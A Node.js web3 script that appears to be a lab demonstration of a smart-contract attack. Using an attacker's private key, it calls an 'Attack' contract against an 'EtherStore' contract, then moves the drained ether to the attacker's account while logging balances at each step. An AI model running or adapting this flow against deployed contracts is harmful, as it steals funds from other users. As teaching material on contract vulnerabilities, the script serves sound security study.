const Web3 = require("web3");
const Provider = require("@truffle/hdwallet-provider");
const info = require("./info.js");

const exec = async () => {
  const attacker = info.attacker;
  const provider = new Web3.providers.HttpProvider(info.rpc);
  Web3.providers.HttpProvider.prototype.sendAsync =
    Web3.providers.HttpProvider.prototype.send;
  const localProvider = new Provider({
    privateKeys: [attacker],
    providerOrUrl: provider,
  });

  const web3 = new Web3(localProvider);
  const accounts = await web3.eth.accounts.privateKeyToAccount(attacker);

  const Attack = new web3.eth.Contract(info.attackABI, info.Attack);

  const EtherStore = new web3.eth.Contract(info.storeABI, info.EtherStore);

  try {
    //before attack -> attacker balance
    await web3.eth.getBalance(accounts.address).then(function (balance) {
      console.log(
        "attacker balances: ",
        web3.utils.fromWei(balance, "ether"),
        "ether"
      );
    });

    //before attack -> EtherStore contract's balance
    const balance = await EtherStore.methods.getBalance().call();
    console.log(
      "EtherStore contract's balances",
      web3.utils.fromWei(balance, "ether"),
      "ether"
    );

    //after attack -> Attack contract's balance
    const balance_attack_b = await Attack.methods.getBalance().call();
    console.log(
      "Attack contranct's balances: ",
      web3.utils.fromWei(balance_attack_b, "ether"),
      "ether"
    );

    //attack
    const tx = await Attack.methods.attack().send({
      from: accounts.address,
      value: 1000000000000000000,
    });
    console.log(tx);

    //after attack -> Attack contract's balance
    const balance_attack = await Attack.methods.getBalance().call();
    console.log(
      "Attack contranct's balances: ",
      web3.utils.fromWei(balance_attack, "ether"),
      "ether"
    );

    //after attack -> EtherStore contract's balance
    const balance_ether = await EtherStore.methods.getBalance().call();
    console.log(
      "EtherStore contract's balances",
      web3.utils.fromWei(balance_ether, "ether"),
      "ether"
    );

    //after attack, transfer Attack contract's balance to attacker
    await Attack.methods.transfer().send({ from: accounts.address });

    //after transfer -> Attack contract's balance
    const balance_transfer = await Attack.methods.getBalance().call();
    console.log(
      "Attack contract's balances: ",
      web3.utils.fromWei(balance_transfer, "ether"),
      "ether"
    );

    //after attack -> attacker balance
    await web3.eth.getBalance(accounts.address).then(function (balance) {
      console.log(
        "attacker balances: ",
        web3.utils.fromWei(balance, "ether"),
        "ether"
      );
    });
  } catch (error) {
    console.log(error);
  }
};

exec();
